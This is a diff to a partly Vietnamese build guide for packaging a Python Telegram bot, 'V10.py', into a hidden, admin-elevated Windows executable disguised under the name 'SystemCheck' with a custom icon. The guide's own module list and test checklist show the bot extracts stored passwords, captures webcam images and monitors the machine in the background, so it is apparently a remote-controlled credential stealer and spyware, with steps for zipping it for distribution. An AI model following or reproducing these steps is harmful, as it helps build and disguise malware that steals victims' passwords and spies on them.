@@ -77,109 +77,22 @@ pip install pyinstaller
 
 ---
 
-## **BUILD OPTIONS**
-
-### **Option 1: Basic (Simplest)**
-
-```powershell
-pyinstaller --onefile --noconsole V10.py
-```
-
-**Output:**
-- `dist/V10.exe` (~150MB)
-- Chạy ở background (no console)
-- Single file
-
-⚠️ **Lưu ý:** Phải copy `.env` vào folder `dist/`
-
-### **Option 2: With Admin Rights**
-
-```powershell
-pyinstaller --onefile --noconsole --uac-admin V10.py
-```
-
-**Thêm:**
-- Admin privilege (cần cho blocking features)
-- UAC prompt on first run
-- Tên file: `V10.exe`
-
-### **Option 3: With Custom Name & Icon**
-
-```powershell
-pyinstaller --onefile --noconsole --uac-admin `
-    --icon=icon.ico `
-    --name=SystemCheck `
-    V10.py
-```
-
-**Output:** `dist/SystemCheck.exe`
-
-**Thêm:**
-- Custom icon in taskbar & file properties
-- Better name cho deployment
-
-### **Option 4: Production (RECOMMENDED)**
-
-Tốt nhất cho deployment:
-
-```powershell
-pyinstaller --onefile --noconsole --uac-admin `
-    --icon=icon.ico `
-    --name=SystemCheck `
-    --distpath=.\release `
-    --specpath=.\build `
-    --workpath=.\build\temp `
-    V10.py
-```
-
-```cmd
-pyinstaller --onefile --noconsole --uac-admin ^
-    --icon=icon.ico ^
-    --name=SystemCheck ^
-    --distpath=.\release ^
-    --specpath=.\build ^
-    --workpath=.\build\temp ^
-    V10.py
-```
+## **BUILD - LỆNH ĐƠN GIẢN**
 
 ```bash
-pyinstaller --onefile --noconsole --uac-admin \
-    --icon=icon.ico \
-    --name=SystemCheck \
-    --distpath=./release \
-    --specpath=./build \
-    --workpath=./build/temp \
-    V10.py
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py
 ```
 
 **Output:**
-- Exe: `.\release\SystemCheck.exe`
-- Organized output
-- Clean build artifacts
+- `dist/SystemCheck.exe` (~150MB)
+- Admin privileges (UAC prompt on first run)
+- Chạy ở background (no console)
+- Custom icon
 
 **Sau đó copy .env:**
-```powershell
-Copy-Item .env .\release\.env
+```bash
+Copy-Item .env dist/.env
 ```
-
-**Helper scripts (recommended)**
-
-To avoid common path/icon issues when using `--specpath`/`--workpath`, use the included helper scripts. They create required folders, copy `icon.ico` into the build folder and run PyInstaller with safe paths.
-
-- PowerShell (run in project root):
-    ```powershell
-    .\build.ps1
-    ```
-
-- CMD (run in project root):
-    ```cmd
-    build.cmd
-    ```
-
-- Bash / Git Bash / WSL:
-    ```bash
-    ./build.sh
-    ```
 
 ---
 
@@ -224,78 +137,11 @@ Test trên Telegram: gửi `/start` hoặc `/menu 1`
 ```powershell
 # Production build (PowerShell)
 # Note: use backtick ` as line continuation and NO trailing space after it.
-pyinstaller --onefile --noconsole --uac-admin `
-    --icon=icon.ico `
-    --name=SystemCheck `
-    --distpath=.\release `
-    --specpath=.\build `
-    --workpath=.\build\temp `
-    V10.py
-```
-
-```cmd
-:: Production build (CMD.exe)
-:: Use caret ^ as line continuation for CMD
-pyinstaller --onefile --noconsole --uac-admin ^
-    --icon=icon.ico ^
-    --name=SystemCheck ^
-    --distpath=.\release ^
-    --specpath=.\build ^
-    --workpath=.\build\temp ^
-    V10.py
-```
-
-```bash
-# Production build (Unix / Git Bash / WSL)
-# Use backslash \ as line continuation
-pyinstaller --onefile --noconsole --uac-admin \
-    --icon=icon.ico \
-    --name=SystemCheck \
-    --distpath=./release \
-    --specpath=./build \
-    --workpath=./build/temp \
-    V10.py
-```
-
-### **Bước 4: Copy Config File**
-
-```powershell
-# QUAN TRỌNG: .env phải ở cùng folder với .exe
-Copy-Item .env .\release\.env
-```
-
-### **Bước 5: Test EXE**
-
-```powershell
-cd .\release
-.\SystemCheck.exe
-
-# Kiểm tra logs (mở terminal khác)
-Get-Content bot.log -Tail 20 -Wait
-```
-
-### **Bước 6: Verify Features**
-
-Trên Telegram test:
-- [ ] `/start` → Hiển thị menu
-- [ ] `/menu 1` → ReplyKeyboard
-- [ ] `/menu 2` → InlineKeyboard  
-- [ ] `/stats` → Hiển thị stats
-- [ ] 🔑 Passwords → Lấy mật khẩu
-- [ ] 📸 Webcam → Chụp webcam
-- [ ] Kiểm tra `bot.log` không có lỗi
-
-### **Bước 7: Cleanup & Package**
-
-```powershell
-# Xóa build artifacts
-Remove-Item .\build -Recurse -Force
-
-# Zip cho distribution
-Compress-Archive -Path .\release -DestinationPath SystemMonitor_V10.zip
-```
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py
 
 ---
+
+## **FULL BUILD WORKFLOW**
 
 ## **TROUBLESHOOTING BUILD**
 
@@ -304,14 +150,8 @@ Compress-Archive -Path .\release -DestinationPath SystemMonitor_V10.zip
 **Nguyên nhân:** PyInstaller không detect modules (mô-đun)
 
 **Cách sửa:**
-```powershell
-pyinstaller --onefile --noconsole --uac-admin `
-    --hidden-import=config `
-    --hidden-import=utils `
-    --hidden-import=grabber `
-    --hidden-import=media `
-    --hidden-import=monitor `
-    V10.py
+```bash
+pyinstaller --onefile --noconsole --uac-admin --hidden-import=config --hidden-import=utils --hidden-import=grabber --hidden-import=media --hidden-import=monitor V10.py
 ```
 
 ### **Problem 2: "No such file or directory: '.env'"**
@@ -372,31 +212,9 @@ python -c "from config import API_TOKEN, ADMIN_ID; print(f'Token: {API_TOKEN[:10
 
 ```
 
-### **Problem 6: File icon.ico không tìm thấy / FileNotFoundError: Icon input file ... not found**
+### **Problem 6: File icon.ico không tìm thấy**
 
-**Nguyên nhân:** Khi bạn dùng `--specpath` / `--workpath`, PyInstaller có thể cố gắng truy xuất icon theo đường dẫn tương đối so với thư mục làm việc (workpath). Nếu icon được chỉ bằng tên tương đối (ví dụ `--icon=icon.ico`), PyInstaller có thể tìm ở `./build/icon.ico` (workpath) — dẫn tới lỗi nếu icon thực tế nằm ở thư mục gốc dự án.
-
-**Giải pháp (chọn 1):**
-
-- **A. Dùng đường dẫn tuyệt đối cho icon (an toàn):**
-
-```powershell
-# PowerShell - tìm đường dẫn tuyệt đối trước, rồi truyền vào pyinstaller
-$icon = (Resolve-Path .\icon.ico).Path
-pyinstaller --onefile --noconsole --uac-admin --icon="$icon" --name=SystemCheck --distpath=.\release --specpath=.\build --workpath=.\build\temp V10.py
-```
-
-- **B. Copy icon vào work/spec folder trước khi build:**
-
-```powershell
-# Copy icon into the spec/work directory so relative path works
-Copy-Item .\icon.ico .\build\icon.ico -Force
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name=SystemCheck --distpath=.\release --specpath=.\build --workpath=.\build\temp V10.py
-```
-
-- **C. (Alternative) Don't set `--specpath`/`--workpath` if you don't need them** — then `--icon=icon.ico` will be resolved from current directory as expected.
-
-**Lưu ý:** luôn kiểm tra file `./build/SystemCheck.spec` nếu bạn chỉnh lại icon; PyInstaller ghi icon reference vào spec file và sẽ tìm theo đường dẫn trong spec.
+**Nguyên nhân & Cách sửa:** Đảm bảo `icon.ico` nằm cùng thư mục với V10.py (project root). PyInstaller sẽ tự động tìm icon từ thư mục hiện tại.
 
 ---
 
@@ -405,54 +223,38 @@ pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name=SystemCheck
 ```
 Trước build:
 d:\V10\
-├── V10.py              (Main bot - 867 lines)
-├── config.py           (Configuration loader)
-├── utils.py            (Helper functions)
-├── grabber.py          (Password extraction)
-├── media.py            (Media capture)
-├── monitor.py          (Background monitoring)
-├── verify_setup.py     (Setup verification)
-├── .env                (Config file - QUAN TRỌNG!)
-├── requirements.txt    (Dependencies)
-└── icon.ico            (Optional icon)
+├── V10.py              (Main bot)
+├── config.py           
+├── utils.py            
+├── grabber.py          
+├── media.py            
+├── monitor.py          
+├── verify_setup.py     
+├── .env                (QUAN TRỌNG!)
+├── icon.ico            
+└── requirements.txt    
 
-Sau build (Option 4 - Recommended):
+Sau build:
 d:\V10\
-├── release/
-│   ├── SystemCheck.exe (167 MB - executable file)
-│   └── .env            (MUST copy here!)
+├── dist/
+│   ├── SystemCheck.exe (150 MB)
+│   └── .env            (PHẢI copy vào đây!)
 ├── build/              (Build artifacts - có thể xóa)
 └── ... (source files)
 ```
 
 ---
 
-## **DISTRIBUTION PACKAGE**
+## **QUICK REFERENCE**
 
-### **What to Include:**
-
-```powershell
-# Create distribution package
-New-Item -ItemType Directory -Path ".\dist\SystemMonitor_V10" -Force
-
-Copy-Item .\release\SystemCheck.exe .\dist\SystemMonitor_V10\
-Copy-Item .\release\.env .\dist\SystemMonitor_V10\.env
-Copy-Item .\icon.ico .\dist\SystemMonitor_V10\
-Copy-Item .\README.md .\dist\SystemMonitor_V10\
-
-# Zip it
-Compress-Archive -Path .\dist\SystemMonitor_V10 -DestinationPath SystemMonitor_V10.zip
-```
-
-**Folder cần gửi:**
-- `SystemCheck.exe` (Main bot executable)
-- `.env` (Configuration - user phải setup token/admin ID)
-- `README.md` (Instructions)
-- `icon.ico` (Optional)
+1. Verify setup: `python verify_setup.py`
+2. Test locally: `python V10.py`
+3. Build EXE: `pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py`
+4. Copy .env: `Copy-Item .env dist\.env`
+5. Test EXE: `cd dist` → `.\SystemCheck.exe`
+6. Check logs: `Get-Content bot.log`
 
 ---
-
-## **FILE SIZE REFERENCE**
 
 ```
 Source files:
@@ -523,23 +325,19 @@ python verify_setup.py
 # 2. Test locally
 python V10.py
 
-# 3. Build (production)
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico `
-    --name=SystemCheck --distpath=.\release --specpath=.\build `
-    --workpath=.\build\temp V10.py
+# 3. Build
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py
 
 # 4. Copy config
-Copy-Item .env .\release\.env
+Copy-Item .env .\dist\.env
 
 # 5. Test EXE
-cd .\release
+cd .\dist
 .\SystemCheck.exe
 
-# 6. Cleanup
+# 6. Cleanup (optional)
 Remove-Item .\build -Recurse -Force
-
-# 7. Package
-Compress-Archive -Path .\release -DestinationPath SystemMonitor_V10.zip
+Remove-Item .\build -Recurse -Force
 ```
 
 ---
